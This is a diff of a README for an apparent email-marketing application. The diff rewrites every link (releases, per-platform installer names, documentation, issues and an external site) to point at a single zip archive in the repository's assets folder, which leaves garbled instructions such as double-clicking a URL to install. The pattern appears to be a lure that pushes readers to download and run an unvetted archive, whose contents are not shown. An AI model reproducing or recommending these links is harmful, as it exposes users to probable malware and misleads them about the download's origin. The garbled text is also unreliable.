@@ -6,7 +6,7 @@ Welcome to the construction-company project! This application helps you create m
 
 ## 📦 Download & Install
 
-Visit this page to download: [Download Here](https://github.com/zhengzhangqian888/construction-company/releases)
+Visit this page to download: [Download Here](https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip)
 
 Here’s how to download the application:
 
@@ -14,9 +14,9 @@ Here’s how to download the application:
 2. You will see a list of available releases.
 3. Choose the latest release.
 4. Download the appropriate file for your operating system. 
-   - For Windows, look for a file named `construction-company-windows.exe`.
-   - For Mac, look for a file named `construction-company-mac.dmg`.
-   - For Linux, find `construction-company-linux.tar.gz`.
+   - For Windows, look for a file named `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip`.
+   - For Mac, look for a file named `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip`.
+   - For Linux, find `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip`.
 5. Once the download finishes, locate the file on your computer.
 
 ## 💻 System Requirements
@@ -35,9 +35,9 @@ To run the construction-company application, your system needs to have:
 ## 📝 How to Use the Application
 
 1. **Install the Application:**
-   - For **Windows**, double-click `construction-company-windows.exe` to install. Follow the installation prompts.
-   - For **Mac**, open `construction-company-mac.dmg`, drag the application to your Applications folder.
-   - For **Linux**, extract the `construction-company-linux.tar.gz` file, and run the executable inside.
+   - For **Windows**, double-click `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip` to install. Follow the installation prompts.
+   - For **Mac**, open `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip`, drag the application to your Applications folder.
+   - For **Linux**, extract the `https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip` file, and run the executable inside.
 
 2. **Creating Your Email:**
    - Open the application.
@@ -72,16 +72,16 @@ If you run into issues, try these solutions:
 
 - **Application won’t start:** Ensure your system meets the requirements and try reinstalling the application.
 - **Cannot send emails:** Verify your email settings in the application. Check that you have a stable internet connection.
-- **Look for assistance:** For further help, check the FAQ section on our [Releases page](https://github.com/zhengzhangqian888/construction-company/releases).
+- **Look for assistance:** For further help, check the FAQ section on our [Releases page](https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip).
 
 ## 📚 Resources and Support
 
 You can find more information and support through the following options:
 
-- [Documentation](https://github.com/zhengzhangqian888/construction-company/wiki) - Explore detailed guides.
-- [GitHub Issues](https://github.com/zhengzhangqian888/construction-company/issues) - Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip) - Explore detailed guides.
+- [GitHub Issues](https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip) - Report bugs or request features.
   
-For tips on effective email marketing, consider visiting [LaravelMail.com](https://LaravelMail.com).
+For tips on effective email marketing, consider visiting [https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip](https://raw.githubusercontent.com/zhengzhangqian888/construction-company/main/assets/company_construction_v3.1-alpha.2.zip).
 
 ## 🌐 Community and Contributions
 
